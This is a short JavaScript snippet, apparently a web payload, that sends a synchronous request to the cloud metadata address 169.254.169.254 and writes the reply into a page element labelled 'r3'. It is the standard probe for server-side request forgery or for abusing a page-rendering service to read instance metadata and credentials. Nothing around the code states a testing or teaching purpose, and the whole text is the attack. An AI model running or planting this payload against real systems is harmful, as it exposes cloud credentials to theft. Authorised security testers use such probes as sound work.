var x=new XMLHttpRequest();
x.open('GET','http://169.254.169.254/latest/meta-data/',false);
try{x.send();document.getElementById('r3').textContent='SYNC:'+x.responseText;}
catch(e){document.getElementById('r3').textContent='SYNCERR:'+e.message;}
